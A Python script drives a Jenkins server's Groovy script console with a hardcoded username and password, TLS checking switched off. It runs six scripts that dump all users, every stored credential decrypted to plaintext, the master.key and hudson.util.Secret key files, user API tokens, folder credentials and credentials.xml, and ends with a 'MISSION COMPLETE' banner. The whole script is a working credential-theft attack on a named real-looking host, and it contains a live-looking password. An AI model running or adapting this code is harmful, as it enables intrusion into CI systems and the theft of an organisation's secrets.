import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, label=""):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(
        BASE + '/crumbIssuer/api/json',
        headers={'Authorization': 'Basic ' + AUTH}
    )
    crumb_resp = opener.open(req, timeout=15).read().decode()
    crumb = json.loads(crumb_resp)
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText',
        data=data,
        headers={
            'Authorization': 'Basic ' + AUTH,
            crumb['crumbRequestField']: crumb['crumb'],
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    )
    result = opener.open(req2, timeout=180).read().decode()
    if label:
        print(f"\n{'='*60}")
        print(f"  {label}")
        print('='*60)
    print(result)
    return result

# ─── TASK 1: ALL USERS ───────────────────────────────────────
script1 = """
import hudson.model.*
println "=== ALL JENKINS USERS ==="
User.getAll().each { u ->
    def email = u.getProperty(hudson.tasks.Mailer.UserProperty)?.getAddress() ?: 'N/A'
    println "${u.id} | ${u.fullName} | ${email}"
}
"""

# ─── TASK 2: ALL CREDENTIALS (DECRYPTED) ─────────────────────
script2 = """
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*
import hudson.util.Secret

println "=== ALL CREDENTIALS ==="
def stores = CredentialsProvider.lookupStores(Jenkins.instance)
stores.each { store ->
    store.domains.each { domain ->
        store.getCredentials(domain).each { c ->
            println "\\n--- ${c.id} (${c.class.simpleName}) ---"
            println "  Description: ${c.description}"
            try { if (c.respondsTo('getUsername')) println "  Username: ${c.getUsername()}" } catch(e) {}
            try { if (c.respondsTo('getPassword')) println "  Password: ${Secret.toString(c.getPassword())}" } catch(e) {}
            try { if (c.respondsTo('getSecret'))   println "  Secret: ${Secret.toString(c.getSecret())}" } catch(e) {}
            try { if (c.respondsTo('getPrivateKey')) println "  PrivateKey: ${c.getPrivateKey()}" } catch(e) {}
            try { if (c.respondsTo('getPassphrase')) println "  Passphrase: ${Secret.toString(c.getPassphrase())}" } catch(e) {}
            try { if (c.respondsTo('getToken'))    println "  Token: ${c.getToken()}" } catch(e) {}
            try { if (c.respondsTo('getApiToken')) println "  ApiToken: ${c.getApiToken()}" } catch(e) {}
            try { println "  RawString: ${c}" } catch(e) {}
        }
    }
}
"""

# ─── TASK 3: ENV VARS + MASTER SECRET ────────────────────────
script3 = """
println "=== GLOBAL ENV VARS ==="
Jenkins.instance.globalNodeProperties.each { p ->
    if (p instanceof hudson.slaves.EnvironmentVariablesNodeProperty) {
        p.envVars.each { k, v -> println "  ${k} = ${v}" }
    }
}

println "\\n=== MASTER SECRET ==="
def masterKey = new File('/var/jenkins_home/secrets/master.key')
if (masterKey.exists()) println masterKey.text.take(500)
else println "NOT FOUND"

println "\\n=== HUDSON SECRET KEY (base64) ==="
def hudsonKey = new File('/var/jenkins_home/secrets/hudson.util.Secret')
if (hudsonKey.exists()) println hudsonKey.bytes.encodeBase64().toString().take(500)
else println "NOT FOUND"

println "\\n=== InitialAdminPassword ==="
def iap = new File('/var/jenkins_home/secrets/initialAdminPassword')
if (iap.exists()) println iap.text.trim()
else println "NOT FOUND"

println "\\n=== secrets/ DIR LISTING ==="
new File('/var/jenkins_home/secrets/').listFiles()?.each { f ->
    println "${f.name} (${f.length()} bytes)"
}
"""

# ─── TASK 4: API TOKENS PER USER ─────────────────────────────
script4 = """
import jenkins.security.*
println "=== USER API TOKENS ==="
User.getAll().each { u ->
    def tokens = u.getProperty(ApiTokenProperty.class)
    if (tokens) {
        println "\\nUser: ${u.id}"
        try {
            def tokenStore = tokens.tokenStore
            tokenStore?.toReadableTokenList()?.each { tok ->
                println "  Token: ${tok.name} | value: ${tok.plainValue ?: 'HASHED'} | createdOn: ${tok.creationDate}"
            }
        } catch(e) {
            println "  (legacy token store) ${tokens.dump()}"
        }
    }
}
"""

# ─── TASK 5: JOBS + BUILD ENV (LOOK FOR INJECTED SECRETS) ────
script5 = """
println "=== ALL JOB NAMES (top 50) ==="
Jenkins.instance.getAllItems(hudson.model.Job.class).take(50).each { j ->
    println "${j.fullName}"
}

println "\\n=== BUILD WRAPPERS / GLOBAL CONFIG ==="
try {
    def desc = Jenkins.instance.getDescriptor("EnvInjectBuildWrapper")
    if (desc) println "EnvInject plugin present: ${desc}"
} catch(e) {}

println "\\n=== CREDENTIALS BINDING STORE (FolderStore) ==="
try {
    import com.cloudbees.plugins.credentials.*
    import com.cloudbees.plugins.credentials.domains.*
    Jenkins.instance.getAllItems(com.cloudbees.hudson.plugins.folder.Folder.class).each { folder ->
        def store = folder.getProperty(FolderCredentialsProperty.class)?.getStore()
        if (store) {
            println "\\nFolder: ${folder.fullName}"
            store.domains.each { domain ->
                store.getCredentials(domain).each { c ->
                    println "  ${c.id} (${c.class.simpleName}): ${c.description}"
                    try { if (c.respondsTo('getUsername')) println "    user: ${c.getUsername()}" } catch(e) {}
                    try { if (c.respondsTo('getPassword')) println "    pass: ${c.getPassword()}" } catch(e) {}
                    try { if (c.respondsTo('getSecret')) println "    secret: ${c.getSecret()}" } catch(e) {}
                }
            }
        }
    }
} catch(e) { println "FolderCreds error: ${e}" }
"""

# ─── TASK 6: FILESYSTEM INTERESTING FILES ────────────────────
script6 = """
println "=== /var/jenkins_home/ TOP-LEVEL ==="
new File('/var/jenkins_home/').listFiles()?.sort { it.name }?.each { f ->
    println "${f.name} (${f.isDirectory() ? 'DIR' : f.length()+' B'})"
}

println "\\n=== /var/jenkins_home/users/ ==="
def usersDir = new File('/var/jenkins_home/users/')
if (usersDir.exists()) {
    usersDir.listFiles()?.each { d ->
        println "  ${d.name}"
        def cfg = new File(d, 'config.xml')
        if (cfg.exists()) println cfg.text.take(2000)
    }
}

println "\\n=== credentials.xml ==="
def cxml = new File('/var/jenkins_home/credentials.xml')
if (cxml.exists()) println cxml.text.take(5000)
else println "NOT FOUND"
"""

# ─── EXECUTE ALL ─────────────────────────────────────────────
all_output = {}

tasks = [
    ("TASK 1 - ALL USERS", script1),
    ("TASK 2 - ALL CREDENTIALS DECRYPTED", script2),
    ("TASK 3 - ENV VARS + MASTER SECRET", script3),
    ("TASK 4 - API TOKENS", script4),
    ("TASK 5 - JOBS + FOLDER CREDS", script5),
    ("TASK 6 - FILESYSTEM DUMP", script6),
]

for label, script in tasks:
    print(f"\n{'#'*70}")
    print(f"  {label}")
    print('#'*70)
    try:
        result = jenkins_exec(script, label)
        all_output[label] = result
    except Exception as ex:
        print(f"  ERROR: {ex}")
        all_output[label] = f"ERROR: {ex}"
    time.sleep(1)

print("\n\n" + "="*70)
print("  MISSION COMPLETE — all tasks executed")
print("="*70)
